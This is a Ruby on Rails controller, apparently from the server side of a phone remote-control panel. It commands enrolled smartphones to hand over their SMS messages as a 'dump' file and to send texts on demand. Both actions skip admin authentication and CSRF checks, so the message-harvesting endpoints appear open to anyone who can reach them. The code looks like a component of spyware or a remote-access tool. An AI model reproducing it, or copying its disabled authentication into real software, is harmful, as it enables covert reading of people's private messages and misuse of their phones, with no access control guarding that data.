class SmsMessagesController < InheritedResources::Base
  skip_before_action :authenticate_admin_user!, raise: false
  skip_before_action :verify_authenticity_token
  include CommandSender
  
  def dump_messages
    begin
      smartphone_id = params[:smartphone_id]
      @smartphone = Smartphone.find(smartphone_id)
      
      # Use send_command_and_wait to get data back
      pending_command = send_command_and_wait(@smartphone, 'get_sms', {}, timeout: 30.seconds)
      
      if pending_command.completed?
        data = pending_command.response_data
        messages = data['messages'] || data['payload']['messages'] || []
        
        # Format messages for display
        formatted_msgs = messages.map do |m|
          "From: #{m['address']} | Date: #{Time.at(m['date'].to_i/1000).strftime('%Y-%m-%d %H:%M')} | #{m['body']}"
        end
        
        commandOutput = ["Fetched #{messages.size} messages:"] + formatted_msgs.first(50) # Limit to 50
      else
         commandOutput = ["Operation Failed: Device did not respond (Timeout)"]
      end
      
      @fileName = "sms_dump_#{Time.now.to_i}.txt"
    rescue => e
      Rails.logger.error("Error on dump messages: #{e.message}")
      commandOutput = ["Operation Failed: #{e.message}"]
      @fileName = "error.txt"
    end
    if want_json?
      render json: { output: commandOutput, filename: @fileName }
    else
      respond_to do |format|
        format.js {
          render "dump_messages",
                 :locals => { :commandOutput => commandOutput,
                              :fileName => @fileName }
        }
      end
    end
  end

  def send_sms
    begin
      # SECURITY FIX: Use strong parameters instead of direct access
      sms_params = sms_message_params
      @smartphone = Smartphone.find(sms_params[:smartphone_id])
      phone_number = sms_params[:phone_number]
      message_body = sms_params[:message_body]
      
      # Send SMS command asynchronously
      pending_command = send_command_async(
        @smartphone,
        'send_sms',
        { phone_number: phone_number, message_body: message_body }
      )
      
      flash[:notice] = "SMS sending command sent to device. Request ID: #{pending_command.request_id}"
      redirect_to sms_messages_path
      
    rescue => e
      Rails.logger.error("Error sending SMS: #{e.message}")
      flash[:alert] = "Failed to send SMS: #{e.message}"
      redirect_to sms_messages_path
    end
  end

  private

  def want_json?
    request.format.json? || request.headers['Accept']&.include?('application/json')
  end

  def sms_message_params
    params.require(:sms_message).permit(:date,
                                        :filename,
                                        :smartphone_id,
                                        :phone_number,
                                        :message_body)
  end
end
